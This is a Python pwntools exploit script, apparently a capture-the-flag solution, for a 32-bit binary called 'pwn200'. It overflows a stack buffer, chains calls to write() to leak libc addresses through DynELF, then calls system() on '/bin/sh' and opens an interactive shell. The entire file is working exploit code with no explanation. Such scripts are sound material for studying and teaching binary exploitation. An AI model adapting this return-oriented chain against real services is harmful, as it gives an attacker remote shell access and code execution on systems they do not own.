from pwn import *

io = remote('0.0.0.0', 10001)			# io = process('./pwn200')
elf = ELF('pwn200')

write_plt = elf.plt['write']
read_plt = elf.plt['read']
binsh_addr = 0x0804a020
pppr_addr = 0x0804856c				# pop ebx; pop edi; pop ebp; ret
_start_addr = 0x080483d0

def leak_func(addr):
	io.recvline()
	payload  = "A"*(0x6c + 4)
	payload += p32(write_plt)			# write(1, addr, 4)
	payload += p32(pppr_addr)			# clean the stack
	payload += p32(1)
	payload += p32(addr)
	payload += p32(4)
	payload += p32(_start_addr)		# _start again
	io.send(payload)
	data = io.recv(4)
	log.info("leaking: 0x%x -> %s" % (addr, (data or '').encode('hex')))
	return data

def leak():
	global system_addr

	d = DynELF(leak_func, elf=elf)
	system_addr = d.lookup('system', 'libc')
	log.info("system address: 0x%x" % system_addr)

def pwn():
	payload  = "A"*(0x6c + 4)
	payload += p32(read_plt)			# read(0, binsh_addr, 8)
	payload += p32(pppr_addr)			# clean the stack
	payload += p32(0)
	payload += p32(binsh_addr)
	payload += p32(8)
	payload += p32(system_addr)		# system(binsh_addr)
	payload += p32(_start_addr)
	payload += p32(binsh_addr)

	io.send(payload)
	io.send("/bin/sh\x00")
	io.interactive()

if __name__ == '__main__':
	leak()
	pwn()
